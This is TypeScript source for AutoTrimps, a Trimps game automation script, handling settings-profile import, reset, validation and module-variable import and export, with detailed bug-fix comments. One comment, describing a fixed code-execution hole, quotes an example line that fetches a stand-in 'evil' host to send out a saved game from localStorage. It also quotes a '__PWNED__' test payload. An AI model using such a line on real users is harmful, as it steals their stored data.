                <td>` + c2list.Meditate.number + `</td>
                <td>` + c2list.Meditate.percent + `</td>
                <td>` + c2list.Meditate.zone + `</td>
                <td bgcolor='black'>
                    <font color=` + c2list.Meditate.color + `>` + c2list.Meditate.percentzone + `
                </td>
            </tr>
            <tr>
                <td>Metal</td>
                <td>` + c2list.Metal.number + `</td>
                <td>` + c2list.Metal.percent + `</td>
                <td>` + c2list.Metal.zone + `</td>
                <td bgcolor='black'>
                    <font color=` + c2list.Metal.color + `>` + c2list.Metal.percentzone + `
                </td>
            </tr>
            <tr>
                <td>Lead</td>
                <td>` + c2list.Lead.number + `</td>
                <td>` + c2list.Lead.percent + `</td>
                <td>` + c2list.Lead.zone + `</td>
                <td bgcolor='black'>
                    <font color=` + c2list.Lead.color + `>` + c2list.Lead.percentzone + `
                </td>
            </tr>
            <tr>
                <td>Nom</td>
                <td>` + c2list.Nom.number + `</td>
                <td>` + c2list.Nom.percent + `</td>
                <td>` + c2list.Nom.zone + `</td>
                <td bgcolor='black'>
                    <font color=` + c2list.Nom.color + `>` + c2list.Nom.percentzone + `
                </td>
            </tr>
            <tr>
                <td>Toxicity</td>
                <td>` + c2list.Toxicity.number + `</td>
                <td>` + c2list.Toxicity.percent + `</td>
                <td>` + c2list.Toxicity.zone + `</td>
                <td bgcolor='black'>
                    <font color=` + c2list.Toxicity.color + `>` + c2list.Toxicity.percentzone + `
                </td>
            </tr>
            <tr>
                <td>Electricity</td>
                <td>` + c2list.Electricity.number + `</td>
                <td>` + c2list.Electricity.percent + `</td>
                <td>` + c2list.Electricity.zone + `</td>
                <td bgcolor='black'>
                    <font color=` + c2list.Electricity.color + `>` + c2list.Electricity.percentzone + `
                </td>
            </tr>
            <tr>
                <td>Coordinate</td>
                <td>` + c2list.Coordinate.number + `</td>
                <td>` + c2list.Coordinate.percent + `</td>
                <td>` + c2list.Coordinate.zone + `</td>
                <td bgcolor='black'>
                    <font color=` + c2list.Coordinate.color + `>` + c2list.Coordinate.percentzone + `
                </td>
            </tr>
            <tr>
                <td>Trimp</td>
                <td>` + c2list.Trimp.number + `</td>
                <td>` + c2list.Trimp.percent + `</td>
                <td>` + c2list.Trimp.zone + `</td>
                <td bgcolor='black'>
                    <font color=` + c2list.Trimp.color + `>` + c2list.Trimp.percentzone + `
                </td>
            </tr>
            <tr>
                <td>Obliterated</td>
                <td>` + c2list.Obliterated.number + `</td>
                <td>` + c2list.Obliterated.percent + `</td>
                <td>` + c2list.Obliterated.zone + `</td>
                <td bgcolor='black'>
                    <font color=` + c2list.Obliterated.color + `>` + c2list.Obliterated.percentzone + `
                </td>
            </tr>
            <tr>
                <td>Eradicated</td>
                <td>` + c2list.Eradicated.number + `</td>
                <td>` + c2list.Eradicated.percent + `</td>
                <td>` + c2list.Eradicated.zone + `</td>
                <td bgcolor='black'>
                    <font color=` + c2list.Eradicated.color + `>` + c2list.Eradicated.percentzone + `
                </td>
            </tr>
            <tr>
                <td>Mapology</td>
                <td>` + c2list.Mapology.number + `</td>
                <td>` + c2list.Mapology.percent + `</td>
                <td>` + c2list.Mapology.zone + `</td>
                <td bgcolor='black'>
                    <font color=` + c2list.Mapology.color + `>` + c2list.Mapology.percentzone + `
                </td>
            </tr>
            <tr>
                <td>Trapper</td>
                <td>` + c2list.Trapper.number + `</td>
                <td>` + c2list.Trapper.percent + `</td>
                <td>` + c2list.Trapper.zone + `</td>
                <td bgcolor='black'>
                    <font color=` + c2list.Trapper.color + `>` + c2list.Trapper.percentzone + `
                </td>
            </tr>
            <tr>
                <td>C3s</td>
                <td>Difficulty</td>
                <td>%C3</td>
                <td>Zone</td>
                <td>%HZE</td>
            </tr>
            <tr>
                <td>Unbalance</td>
                <td>` + c2list.Unbalance.number + `</td>
                <td>` + c2list.Unbalance.percent + `</td>
                <td>` + c2list.Unbalance.zone + `</td>
                <td bgcolor='black'>
                    <font color=` + c2list.Unbalance.color + `>` + c2list.Unbalance.percentzone + `
                </td>
            </tr>
            <tr>
                <td>Unlucky</td>
                <td>` + c2list.Unlucky.number + `</td>
                <td>` + c2list.Unlucky.percent + `</td>
                <td>` + c2list.Unlucky.zone + `</td>
                <td bgcolor='black'>
                    <font color=` + c2list.Unlucky.color + `>` + c2list.Unlucky.percentzone + `
                </td>
            </tr>
            <tr>
                <td>Duel</td>
                <td>` + c2list.Duel.number + `</td>
                <td>` + c2list.Duel.percent + `</td>
                <td>` + c2list.Duel.zone + `</td>
                <td bgcolor='black'>
                    <font color=` + c2list.Duel.color + `>` + c2list.Duel.percentzone + `
                </td>
            </tr>
	    <tr>
                <td>Storm</td>
                <td>` + c2list.Storm.number + `</td>
                <td>` + c2list.Storm.percent + `</td>
                <td>` + c2list.Storm.zone + `</td>
                <td bgcolor='black'>
                    <font color=` + c2list.Storm.color + `>` + c2list.Storm.percentzone + `
                </td>
            </tr>
            <tr>
                <td>Transmute</td>
                <td>` + c2list.Transmute.number + `</td>
                <td>` + c2list.Transmute.percent + `</td>
                <td>` + c2list.Transmute.zone + `</td>
                <td bgcolor='black'>
                    <font color=` + c2list.Transmute.color + `>` + c2list.Transmute.percentzone + `
                </td>
            </tr>
            <tr>
                <td>Quest</td>
                <td>` + c2list.Quest.number + `</td>
                <td>` + c2list.Quest.percent + `</td>
                <td>` + c2list.Quest.zone + `</td>
                <td bgcolor='black'>
                    <font color=` + c2list.Quest.color + `>` + c2list.Quest.percentzone + `
                </td>
            </tr>
            <tr>
                <td>Downsize</td>
                <td>` + c2list.Downsize.number + `</td>
                <td>` + c2list.Downsize.percent + `</td>
                <td>` + c2list.Downsize.zone + `</td>
                <td bgcolor='black'>
                    <font color=` + c2list.Downsize.color + `>` + c2list.Downsize.percentzone + `
                </td>
            </tr>
	    <tr>
                <td>Smithless</td>
                <td>` + c2list.Smithless.number + `</td>
                <td>` + c2list.Smithless.percent + `</td>
                <td>` + c2list.Smithless.zone + `</td>
                <td bgcolor='black'>
                    <font color=` + c2list.Smithless.color + `>` + c2list.Smithless.percentzone + `
                </td>
            </tr>
            <tr>
                <td>Glass</td>
                <td>` + c2list.Glass.number + `</td>
                <td>` + c2list.Glass.percent + `</td>
                <td>` + c2list.Glass.zone + `</td>
                <td bgcolor='black'>
                    <font color=` + c2list.Glass.color + `>` + c2list.Glass.percentzone + `
                </td>
            </tr>
            <tr>
                <td>Trappapalooza</td>
                <td>` + c2list.Trappapalooza.number + `</td>
                <td>` + c2list.Trappapalooza.percent + `</td>
                <td>` + c2list.Trappapalooza.zone + `</td>
                <td bgcolor='black'>
                    <font color=` + c2list.Trappapalooza.color + `>` + c2list.Trappapalooza.percentzone + `
                </td>
            </tr>
	    <tr>
                <td>Berserk</td>
                <td>` + c2list.Berserk.number + `</td>
                <td>` + c2list.Berserk.percent + `</td>
                <td>` + c2list.Berserk.zone + `</td>
                <td bgcolor='black'>
                    <font color=` + c2list.Berserk.color + `>` + c2list.Berserk.percentzone + `
                </td>
            </tr>
            <tr>
                <td>Wither</td>
                <td>` + c2list.Wither.number + `</td>
                <td>` + c2list.Wither.percent + `</td>
                <td>` + c2list.Wither.zone + `</td>
                <td bgcolor='black'>
                    <font color=` + c2list.Wither.color + `>` + c2list.Wither.percentzone + `
                </td>
            </tr>
            <tr>
                <td>Total</td>
                <td> </td>
                <td>` + game.global.totalSquaredReward + `%</td>
                <td> </td>
                <td></td>
            </tr>
        </tbody>
    </table>
</div>`;
        costText = "<div class='maxCenter'><div id='confirmTooltipBtn' class='btn btn-info' onclick='cancelTooltip();'>Close</div></div>";
    } else if (what == 'ReadSettingsProfiles') {
        titleText = '<b>Loading New AutoTrimps Profile...</b><p>Current Settings will be lost';
        tooltipText = '<b>NOTICE:</b> Switching to new AutoTrimps settings profile!!!! <br>All current settings <b>WILL</b> be lost after this point. <br>You might want to cancel, to go back and save your existing settings first....';
        costText = "<div class='maxCenter'><div id='confirmTooltipBtn' class='btn btn-info' style='width: 10vw' onclick='cancelTooltip(); confirmedSwitchNow();'>Confirm and Switch Profiles</div><div style='margin-left: 15%' class='btn btn-info' style='margin-left: 5vw' onclick='cancelTooltip();'>Cancel</div></div>";
    } else if (what == 'ResetDefaultSettingsProfiles') {
        titleText = '<b>Loading AutoTrimps Default Profile...</b><p>Current Settings will be lost!';
        tooltipText = '<b>NOTICE:</b> Switching to Default AutoTrimps settings profile!!!! <br>All current settings <b>WILL</b> be lost after this point. <br>You might want to cancel, to go back and save your existing settings first.... <br>This will <b><u>Reset</u></b> the script to factory settings.';
        costText = "<div class='maxCenter'><div id='confirmTooltipBtn' class='btn btn-info' style='width: 10vw' onclick='cancelTooltip(); resetAutoTrimps(); settingsProfiles.selectedIndex = 1;'>Reset to Default Profile</div><div style='margin-left: 15%' class='btn btn-info' style='margin-left: 5vw' onclick='cancelTooltip();'>Cancel</div></div>";
    } else if (what == 'NameSettingsProfiles') {
        titleText = "Enter New Settings Profile Name";
        tooltipText = "What would you like the name of the Settings Profile to be?<br/><br/><textarea id='setSettingsNameTooltip' style='width: 100%' rows='1'></textarea>";
        costText = "<div class='maxCenter'><div id='confirmTooltipBtn' class='btn btn-info' style='width: 10vw' onclick='cancelTooltip(); nameAndSaveNewProfile();'>Import</div><div class='btn btn-info' style='margin-left: 5vw' onclick='cancelTooltip();document.getElementById(\"settingsProfiles\").selectedIndex=0;'>Cancel</div></div>";
        ondisplay = function() {
            byId('setSettingsNameTooltip').focus();
        };
    } else if (what == 'DeleteSettingsProfiles') {
        titleText = "<b>WARNING:</b> Delete Profile???"
        // #235 — the profile NAME is user-supplied text going into an innerHTML string.
        tooltipText = "You are about to delete the <B><U>"+escapeHtml(settingsProfiles.value)+"</B></U> settings profile.<br>This will not switch your current settings though. Continue ?<br/>";
        costText = "<div class='maxCenter'><div id='confirmTooltipBtn' class='btn btn-info' onclick='cancelTooltip(); onDeleteProfile();'>Delete Profile</div><div style='margin-left: 15%' class='btn btn-info' onclick='cancelTooltip();'>Cancel</div></div>";
    } else if (what == 'message') {
        titleText = "Generic message";
        // #235 — every caller passes plain prose (verified: seven call sites, no intentional markup),
        // and several splice a user-supplied profile name into it. Escaping here closes that channel
        // at ONE seam instead of asking each caller to remember.
        tooltipText = escapeHtml(event);
        costText = "<div class='maxCenter'><div id='confirmTooltipBtn' class='btn btn-info' style='width: 50%' onclick='cancelTooltip();'>OK</div></div>";
    }
    game.global.lockTooltip = true;
    $elem.style.left = "33.75%";
    $elem.style.top = "25%";
    document.getElementById("tipTitle")!.innerHTML = titleText;
    document.getElementById("tipText")!.innerHTML = tooltipText;
    document.getElementById("tipCost")!.innerHTML = costText;
    $elem.style.display = "block";
    if (ondisplay !== null)
        ondisplay();
}

// #87 — the ATrunning latch is now restored in a `finally`, not on the happy path.
// mainLoop's first statement is `if (ATrunning == false) return;`. So ANY throw between the
// `ATrunning = false` here and the `ATrunning = true` at the bottom does not merely fail the reset —
// it leaves AutoTrimps switched OFF, permanently, until the page is reloaded. The body below tears
// down and rebuilds the entire settings DOM (eleven calls, five of them `document.getElementById(...)!`
// non-null assertions that are only *asserted* to be non-null), which is exactly the kind of code that
// throws. #71a was the same shape in resetModuleVars() and it really did kill AT with one click.
// A `finally` makes the latch un-strandable regardless of what the body does.
// #243 — WAS: `setTimeout((function(d) { …body… } as any)(a), 101)`. The parenthesised operand is
// the function expression and `(a)` CALLS it, so the whole body ran SYNCHRONOUSLY inside the click
// handler and setTimeout received the closure's `undefined` return. There was no 101 ms defer — the
// same defect #71a found and fixed in the sibling resetModuleVars. Two consequences: a stray
// `setTimeout(undefined, 101)` per reset (per the HTML spec a non-callable TimerHandler is coerced
// to a string and compiled as a classic script — inert here, since the text is the literal
// "undefined" and the game page ships no CSP), and a hand-written `as any` whose only job was to
// stop tsc reporting `void` where a TimerHandler belongs, i.e. to hide the bug from the type checker.
//
// The fix is NOT the #71a fix. Making the defer real would regress a visible behaviour: the
// factory-reset onclick (:885) is `cancelTooltip(); resetAutoTrimps(); settingsProfiles.selectedIndex = 1;`
// and initializeAllSettings() ends in settingsProfileMakeGUI(), which builds a BRAND-NEW <select>
// whose initializeSettingsProfiles() sets selectedIndex = 0 (:62). Under today's synchronous order
// the onclick tail lands on the new select and the dropdown correctly reads "Reset to Default";
// under a real defer it would land on the doomed old one and the deferred rebuild would snap the new
// one back to "Current". The legacy author left the fossil of exactly that attempt at :88-89. There
// is also nothing for the ATrunning window to protect — the body has no await, no yield and no
// nested timer, and JS is single-threaded, so a mainLoop tick cannot interleave with it either way.
//
// So: drop the timer, keep the order. Behaviour is byte-for-byte what shipped, the stray timer is
// gone, and tsc can see this code again.
export function resetAutoTrimps(a?: any, b?: any) {
    // #210 — the CHOKE POINT. Every path that adopts a settings store funnels through here: the
    // pasted import, a settings-profile switch, and the factory reset. Validating at loadAutoTrimps
    // alone would leave the profile path unguarded, and a stored profile is no more trustworthy than
    // a pasted string — both live in localStorage, which is exactly what a bad import writes to.
    // Deliberately BEFORE `ATrunning = !1`, and returning rather than throwing, so a corrupt stored
    // profile cannot strand the latch or kill the click handler it was invoked from.
    if (a !== undefined && a !== null) {
        try {
            validateSettingsBlob(a);
        } catch (err: any) {
            debug("Refusing to apply a malformed settings store: " + err.message, "profile");
            ImportExportTooltip("message", "Those settings could not be applied: " + err.message + " Nothing was changed.");
            return;
        }
    }
    ATrunning = !1;
    try {
        localStorage.removeItem("autoTrimpSettings");
        autoTrimpSettings = a ? a : {};
        var e = document.getElementById("settingsRow")!;
        e.removeChild(document.getElementById("autoSettings")!);
        e.removeChild(document.getElementById("autoTrimpsTabBarMenu")!);
        automationMenuSettingsInit();
        initializeAllTabs();
        initializeAllSettings();
        // #241 — the standalone `initializeSettingsProfiles()` that used to sit HERE is gone.
        // initializeAllSettings() ends in settingsProfileMakeGUI() (settings-defs.ts:3010), which has
        // called initializeSettingsProfiles() itself since #72 ("whoever renders the control also
        // fills it"). initializeSettingsProfiles() has no idempotence guard, so the second call
        // appended every stored profile a SECOND time — every import, profile switch and factory
        // reset left the dropdown reading [Current, Reset, Save New…, p0…pN, p0…pN]. The duplicates
        // then desynchronised the delete arithmetic from the store. The boot path
        // (settings-boot.ts) never had the extra call and has always populated exactly once.
        updateCustomButtons();
        saveSettings();
        checkPortalSettings();
    } finally {
        ATrunning = !0;
    }
    if (a) {
        debug("Successfully imported new AT settings...", "profile");
        if (b) ImportExportTooltip("message", "Successfully Imported Autotrimps Settings File!: " + b);
        else ImportExportTooltip("NameSettingsProfiles");
    } else {
        debug("Successfully reset AT settings to Defaults...", "profile");
        ImportExportTooltip("message", "Autotrimps has been successfully reset to its defaults!");
    }
}
// #210 — the validating seam for an ADOPTED settings store. The sibling paste box in this same file
// (importModuleVars) has had exactly this treatment since #76B; this one never did, and its gate was
// close to vacuous: `JSON.parse` then `if (null == b) return`, which rejects literal `null` and
// nothing else. `42`, `[]`, `"hi"`, `false` and `0` all sailed through — and because resetAutoTrimps
// ran `localStorage.removeItem("autoTrimpSettings")` BEFORE assigning, a malformed paste destroyed
// the user's settings file and then threw at the first createSetting (strict mode: you cannot create
// a property on a number). Silent total settings loss, no undo. Validation now happens with nothing
// yet destroyed.
//
// WHAT THIS DELIBERATELY DOES NOT DO: reject unknown setting ids. parseModuleVars can demand that
// every key be known because MODULES is this build's own namespace, but a settings blob is a
// cross-version artifact — and measured against the current build, the two preset strings THIS REPO
// SHIPS (utils.ts serializeSettings60 / serializeSettings550) carry 80 of 254 and 82 of 256 keys
// that no longer exist. An unknown-key rejection would make AT refuse its own documented "550+ AT
// Settings" preset. Stale ids round-trip harmlessly today and cleanupAutoTrimps (#76A) is the
// purpose-built, confirm-gated tool for purging them.
//
// So the contract is SHAPE, not membership, and it is atomic — one bad entry rejects the whole
// paste rather than half-applying it:
//   · a plain object (not an array, not a primitive, not null)
//   · carrying `ATversion`, the key loadPageVariables() gates the saved file on — which is also what
//     distinguishes an AT settings string from some other JSON the user pasted by mistake
//   · every value pure JSON data, checked recursively by the existing isJsonLiteral. Records are
//     allowed, not just flat values: the shipped presets contain three (PrestigeBackup, EnableAFK,
//     ChangeLog)
//   · no `__proto__` / `constructor` / `prototype` at ANY depth — isJsonLiteral already enforces
//     this below the top level, so only the top level needs its own check
//
// Note what this does NOT buy on its own: a legitimate textValue setting holds arbitrary text (map
// names, farm strings), so no validator can reject a payload here without rejecting real values.
// That half of #210 is closed at the RENDER seam under #235 — persisted values are no longer parsed
// as markup anywhere. Neither half is sufficient alone.
export function parseSettingsBlob(text: string): Record<string, any> {
    var incoming = JSON.parse(String(text).replace(/[\n\r]/gm, ""));  // throws SyntaxError on malformed input
    return validateSettingsBlob(incoming);
}

function validateSettingsBlob(incoming: any): Record<string, any> {
    if (!isPlainObject(incoming))
        throw new Error('expected a JSON object of settings, got ' + (incoming === null ? 'null' : Array.isArray(incoming) ? 'an array' : typeof incoming) + '.');
    var keys = Object.keys(incoming);
    if (keys.length === 0) throw new Error('the settings object is empty.');
    if (!Object.prototype.hasOwnProperty.call(incoming, 'ATversion'))
        throw new Error('this is not an AutoTrimps settings string (no ATversion key).');
    for (var i = 0; i < keys.length; i++) {
        var key = keys[i];
        if (PROTO_KEYS.has(key)) throw new Error('illegal setting id: ' + key);
        if (!isJsonLiteral(incoming[key]))
            throw new Error('unsupported value for ' + key + ' (settings may only contain JSON data).');
    }
    return incoming;
}

export function loadAutoTrimps() {
    var parsed: Record<string, any>;
    try {
        parsed = parseSettingsBlob(byId("importBox").value);
    } catch (c: any) {
        debug("Error importing AT settings, the string is bad. " + c.message, "profile");
        // The old code only debug()'d, so a rejected paste looked exactly like a successful one.
        ImportExportTooltip("message", "That settings string was not imported: " + c.message + " Your existing settings are untouched.");
        return;
    }
    debug("Importing new AT settings file...", "profile");
    resetAutoTrimps(parsed);
}
// #76(A) — WAS:
//     for (var a in autoTrimpSettings) { var b = document.getElementById(autoTrimpSettings[a].id);
//                                        null == b && delete autoTrimpSettings[a] }
// i.e. "no DOM node right now" ⇒ "not a setting" ⇒ DELETE. Two things are wrong with that, and the
// second one destroys the whole file:
//
//  1. The DOM is the wrong oracle. A control that is hidden, or whose tab has not been built, or
//     that is mid-boot, has no node — and none of that makes it a dead setting. The question the
//     purge actually wants to ask is "does THIS BUILD still declare this id?", which is now answered
//     by settings-engine's definedSettingIds census, not by a DOM lookup.
//  2. autoTrimpSettings holds keys that are NOT setting records. `ATversion` is a bare string
//     (settings-engine.ts writes `autoTrimpSettings["ATversion"] = ATversion`), so `.id` is
//     undefined, `getElementById(undefined)` is null, and it was deleted on every run. It is the key
//     `loadPageVariables()` (utils.ts) gates the entire saved file on — so one click of the Cleanup
//     button, then any saveSettings(), then a refresh, and ALL ~548 settings are silently back to
//     defaults with no undo. Reproduced end-to-end on a fully-booted game+AT jsdom boot: of 548
//     keys, `ATversion` was the ONE key with no DOM node, and it was the one that got deleted.
//
// The purge itself is LOAD-BEARING and stays (see #68): loadPageVariables() restores the whole
// localStorage blob and serializeSettings() round-trips unknown keys forever, so this is the only
// thing that ever removes a stale id — and a stale id is not inert, it RESURRECTS if that id is ever
// re-minted. So: keep the purge, fix its predicate, and stop firing it without consent
// (ImportExportTooltip now previews the candidate list and only deletes on an explicit confirm).
const NON_SETTING_KEYS = new Set(['ATversion']);

// Pure: what cleanupAutoTrimps() WOULD delete. No mutation — the tooltip renders this.
export function cleanupCandidates(): string[] {
    // Anti-footgun: an empty census means the settings UI never booted, NOT that no setting exists.
    // Purging against an empty census would delete every key in the file.
    if (definedSettingIds.size === 0) return [];
    var stale: string[] = [];
    for (var key in autoTrimpSettings) {
        if (!Object.prototype.hasOwnProperty.call(autoTrimpSettings, key)) continue;
        if (NON_SETTING_KEYS.has(key)) continue;   // bare values, not settings — never purge
        if (definedSettingIds.has(key)) continue;  // this build still declares it — it is live
        stale.push(key);
    }
    return stale;
}

export function cleanupAutoTrimps(): string[] {
    var stale = cleanupCandidates();
    for (var i = 0; i < stale.length; i++) delete autoTrimpSettings[stale[i]];
    return stale;
}
export function exportModuleVars(){return JSON.stringify(compareModuleVars())}

// #102 — WAS: `var b = MODULESdefault[mod][vj]` with no guard on `MODULESdefault[mod]`.
//
// MODULESdefault was populated in exactly ONE place — `delayStartAgain()` (AutoTrimps2.js), the second
// link of the `setTimeout` startup chain, i.e. `2 × startupDelay` = 8s after page load. Until then it
// is the bare `var MODULESdefault = {}` (AutoTrimps2.js:103), so `MODULESdefault[mod]` is `undefined`
// and this line throws `TypeError: Cannot read properties of undefined`. The settings GUI is already
// mounted at 4s (`delayStart` → `initializeAutoTrimps`), so for a full four seconds the Import/Export
// tab's Export button and "Reset Module Vars" are clickable and both land in the hole. Reset is the
// nastier one: it throws AFTER `ATrunning = false` and BEFORE the line that restores it, so AT stays
// dead until reload — the same shape as #71a.
//
// Fixed at BOTH ends, because neither end suffices alone:
//
//  1. `MODULESdefault` is now seeded EAGERLY at bundle-eval time (src/main.ts), which removes the
//     window rather than papering over it. It is a deep clone of MODULES, and MODULES is fully
//     constructed by then — for every module the src bundle owns.
//
//  2. …but NOT for `graphs`. ⚠️ `MODULES.graphs` is registered by `legacy/Graphs.js`, which the build
//     emits AFTER the src IIFE (see MANIFEST) — so at end-of-main.ts it does not exist yet, and an
//     eager seed alone would leave `MODULESdefault['graphs']` undefined while `MODULES.graphs` exists.
//     compareModuleVars() iterates `Object.keys(MODULES)`, so it would have thrown on exactly the same
//     line, for exactly the same reason. The eager fix ALONE IS NOT A FIX. So the read is also made
//     total: a module with no recorded default has no knowable overrides, and reports none. (After
//     delayStartAgain re-seeds at 8s, `graphs` has a default and diffs normally — unchanged from today.)
//
// Consequence: compareModuleVars() is now TOTAL. With MODULESdefault entirely unpopulated it returns
// `{}` — "no overrides yet", which is also exactly what it returns right after resetModuleVars().
export function compareModuleVars() {
    var diffs: Record<string, any> = {};
    var mods = Object.keys(MODULES);
    for (var i in mods) {
        var mod = mods[i];
        var defaults = MODULESdefault[mod];
        if (defaults === undefined || defaults === null) continue;
        var vars = Object.keys(MODULES[mods[i]]);
        for (var j in vars) {
            var vj = vars[j];
            var a = MODULES[mod][vj];
            var b = defaults[vj];
            if (JSON.stringify(a)!=JSON.stringify(b)) {
                if (typeof diffs[mod] === 'undefined')
                    diffs[mod] = {};
                diffs[mod][vj] = a;
            }
        }
    }
    return diffs;
}

/**
 * #102 — seed MODULESdefault at bundle-eval time, closing the 8-second window in which
 * compareModuleVars()/exportModuleVars()/resetModuleVars() threw (see the comment above).
 *
 * Called from src/main.ts AFTER every side-effect import, so every `MODULES["x"] = {…}` the src bundle
 * performs has already run. `delayStartAgain()` still re-seeds later; that pass is a superset (it also
 * catches `MODULES.graphs`, registered by the post-IIFE legacy Graphs.js) and leaves steady-state
 * behavior byte-identical to before.
 */
export function seedModuleDefaults() {
    MODULESdefault = JSON.parse(JSON.stringify(MODULES));
}

// #76(B) — WAS: split the import textarea on newlines, truncate each line at its first `;`, strip
// whitespace, and hand it to the dynamic-code sink. That is arbitrary code execution in page context
// (`@grant none`) on anything the user pastes — `fetch('https://evil/'+localStorage.trimpSave1);` is
// a valid "settings string". Reproduced on a real game+AT jsdom boot: pasting `window.__PWNED__=1;`
// set it.
//
// It was ALSO a total no-op on the exporter's own output, and had been since 2016 (genBTC `3c4837f0`
// switched exportModuleVars to JSON and left the assignment-line importer behind): exportModuleVars()
// emits `JSON.stringify(compareModuleVars())` — one line, `{"mod":{"key":val}}`, with no `;` in it at
// all. `indexOf(';')` is -1 ⇒ `substring(0, 0)` ⇒ the empty string ⇒ nothing applied. So export →
// import round-tripped NOTHING. There is no legacy `MODULES.x.y=1;` string to stay compatible with
// either: the format has been JSON for the entire life of the exporter.
//
// So we PARSE the exporter's grammar instead of executing the paste, and accept EXACTLY it:
//   • top level: a JSON object of known module names (own key of both MODULES and MODULESdefault)
//   • per module: an object of field names this build declared at boot (own key of MODULESdefault[mod])
//   • per field: a JSON literal (null / finite number / boolean / string / arrays / plain objects of
//     those — no functions, no NaN/Infinity, no prototype keys) whose SHAPE matches that field's
//     default (same typeof, same array-ness). A `null` default accepts any literal, because that is
//     the "unset" default (jobs.customRatio et al) whose real value the user is importing.
// Validation is total and happens BEFORE any write: one bad entry rejects the whole paste (the old
// sink could half-apply), reported through the existing debug() channel rather than thrown.
//
// storedMODULES (⚠️ #71): still removed-then-rewritten from compareModuleVars() — do not regress
// this back to reading a `storedMODULES` identifier, which nothing assigns (ReferenceError).
const PROTO_KEYS = new Set(['__proto__', 'constructor', 'prototype']);

function isPlainObject(v: any): boolean {
    return v !== null && typeof v === 'object' && !Array.isArray(v) && (Object.getPrototypeOf(v) === Object.prototype || Object.getPrototypeOf(v) === null);
}

function isJsonLiteral(v: any): boolean {
    if (v === null) return true;
    var t = typeof v;
    if (t === 'boolean' || t === 'string') return true;
    if (t === 'number') return Number.isFinite(v);
    if (Array.isArray(v)) return v.every(isJsonLiteral);
    if (isPlainObject(v)) return Object.keys(v).every((k) => !PROTO_KEYS.has(k) && isJsonLiteral(v[k]));
    return false;
}

function shapeMatchesDefault(value: any, dflt: any): boolean {
    if (dflt === null) return true;                       // "unset" default — any literal is a valid set
    if (value === null) return false;
    if (Array.isArray(dflt) !== Array.isArray(value)) return false;
    return typeof dflt === typeof value;
}

// Exported for the net: the pure validator. Returns the flat [module, field, value] writes an
// import would perform, or throws an Error naming the first violation (caller turns it into debug()).
export function parseModuleVars(text: string): [string, string, any][] {
    var incoming = JSON.parse(text);  // throws SyntaxError on malformed input
    if (!isPlainObject(incoming)) throw new Error('expected a JSON object of modules.');
    var writes: [string, string, any][] = [];
    var mods = Object.keys(incoming);
    for (var i = 0; i < mods.length; i++) {
        var mod = mods[i];
        if (PROTO_KEYS.has(mod)) throw new Error('illegal module name: ' + mod);
        if (!Object.prototype.hasOwnProperty.call(MODULES, mod) || !Object.prototype.hasOwnProperty.call(MODULESdefault, mod))
            throw new Error('unknown module: ' + mod);
        var fields = incoming[mod];
        if (!isPlainObject(fields)) throw new Error('module ' + mod + ' is not an object of variables.');
        var keys = Object.keys(fields);
        for (var j = 0; j < keys.length; j++) {
            var key = keys[j];
            if (PROTO_KEYS.has(key)) throw new Error('illegal variable name: ' + mod + '.' + key);
            if (!Object.prototype.hasOwnProperty.call(MODULESdefault[mod], key))
                throw new Error('unknown variable: ' + mod + '.' + key);
            var value = fields[key];
            if (!isJsonLiteral(value)) throw new Error('unsupported value for ' + mod + '.' + key);
            if (!shapeMatchesDefault(value, MODULESdefault[mod][key]))
                throw new Error('wrong type for ' + mod + '.' + key + ' (expected ' + (Array.isArray(MODULESdefault[mod][key]) ? 'array' : typeof MODULESdefault[mod][key]) + ').');
            writes.push([mod, key, value]);
        }
    }
    return writes;
}

export function importModuleVars() {
    var writes: [string, string, any][];
    try {
        writes = parseModuleVars(byId<HTMLTextAreaElement>('importBox').value);
    } catch (a: any) {
        return void debug('Error importing MODULE vars, the string is bad.' + a.message, 'profile');
    }
    for (var i = 0; i < writes.length; i++) MODULES[writes[i][0]][writes[i][1]] = writes[i][2];
    localStorage.removeItem('storedMODULES');
    safeSetItems('storedMODULES', JSON.stringify(compareModuleVars()));
}
// #71a — this function had TWO defects, both fatal, both invisible to tsc.
//
// 1. `JSON.stringify(storedMODULES)` read a name NOTHING in the shipped bundle ever assigns. That is a
//    bare read of an undeclared identifier, i.e. a ReferenceError — not a benign `undefined`. It threw
//    AFTER `ATrunning = false` and BEFORE the line that restores it, so clicking "Reset Module Vars"
//    did not merely fail: it stopped AutoTrimps DEAD until the page was reloaded. `tsc` was green only
//    because at-legacy.d.ts declared `var storedMODULES: any` — a promise the type-checker cannot audit.
//    Its two sibling writers say what it is meant to hold: AutoTrimps2.js:380 and importModuleVars()
//    (:922 above) both persist `JSON.stringify(compareModuleVars())`. So that is what we persist. After
//    `MODULES = MODULESdefault` that diff is `{}` — the semantically correct "no overrides" state, and
//    consistent with the localStorage.removeItem on the line before it.
//
// 2. `setTimeout((function(){…})(a), 101)` IMMEDIATELY INVOKED the closure and handed setTimeout its
//    `undefined` return. There was no 101ms defer at all — the body ran synchronously, which makes the
//    `ATrunning` false→true window meaningless (it closes in the same tick it opened). The window only
//    makes sense if the body is actually deferred past the in-flight mainLoop tick, so defer it.
//
// The `a` parameter was only ever passed to a zero-arg closure and discarded; the sole caller (:305)
// passes nothing. De-comma'd from the legacy sequence — exactly equivalent to sequential statements.
// #87 — `ATrunning = true` moved into a `finally`. #71a fixed the two throws that were actually in
// this body; the `finally` fixes the SHAPE, so the next throw introduced here (compareModuleVars()
// walks MODULES and MODULESdefault — neither is beyond throwing) cannot strand the latch and kill
// AutoTrimps until reload. The bug class, not just its two instances.
export function resetModuleVars() {
    ATrunning = false;
    setTimeout(function() {
        try {
            localStorage.removeItem('storedMODULES');
            MODULES = JSON.parse(JSON.stringify(MODULESdefault));
            safeSetItems('storedMODULES', JSON.stringify(compareModuleVars()));
        } finally {
            ATrunning = true;
        }
    }, 101);
}
settingsProfileMakeGUI();
initializeSettingsProfiles();
